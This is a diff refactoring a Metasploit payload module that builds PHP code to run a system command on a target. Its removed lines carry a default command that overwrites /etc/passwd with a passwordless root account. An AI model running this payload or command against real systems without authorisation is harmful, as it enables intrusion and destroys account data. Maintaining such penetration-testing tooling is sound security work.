@@ -1,55 +1,49 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-require 'msf/core/payload/php'
-require 'msf/core/handler/bind_tcp'
-require 'msf/base/sessions/command_shell'
-
-
 module MetasploitModule
-
   CachedSize = :dynamic
 
   include Msf::Payload::Single
   include Msf::Payload::Php
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'PHP Execute Command ',
-      'Description'   => 'Execute a single system command',
-      'Author'        => [ 'egypt' ],
-      'License'       => BSD_LICENSE,
-      'Platform'      => 'php',
-      'Arch'          => ARCH_PHP
-      ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'PHP Execute Command ',
+        'Description' => 'Execute a single system command',
+        'Author' => [ 'egypt' ],
+        'License' => BSD_LICENSE,
+        'Platform' => 'php',
+        'Arch' => ARCH_PHP
+      )
+    )
     register_options(
       [
-        OptString.new('CMD', [ true, "The command string to execute", 'echo "toor::0:0:::/bin/bash">/etc/passwd' ]),
-      ], self.class)
+        OptString.new('CMD', [ true, 'The command string to execute' ]),
+      ]
+    )
   end
 
   def php_exec_cmd
-
-    cmd = Rex::Text.encode_base64(datastore['CMD'])
-    dis = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
-    shell = <<-END_OF_PHP_CODE
-    $c = base64_decode("#{cmd}");
-    #{php_preamble({:disabled_varname => dis})}
-    #{php_system_block({:cmd_varname=>"$c", :disabled_varname => dis})}
+    # please do not copy me into new code, instead use the #php_exec_cmd method after including Msf::Payload::Php or
+    # use the PHP adapter payload by selecting any php/unix/cmd/* payload
+    vars = Rex::RandomIdentifier::Generator.new(language: :php)
+    shell <<-END_OF_PHP_CODE
+      #{php_preamble(vars_generator: vars)}
+      #{php_system_block(vars_generator: vars, cmd: datastore['CMD'])}
     END_OF_PHP_CODE
 
-    return Rex::Text.compress(shell)
+    Rex::Text.compress(shell)
   end
 
   #
   # Constructs the payload
   #
-  def generate
+  def generate(_opts = {})
     return php_exec_cmd
   end
-
 end
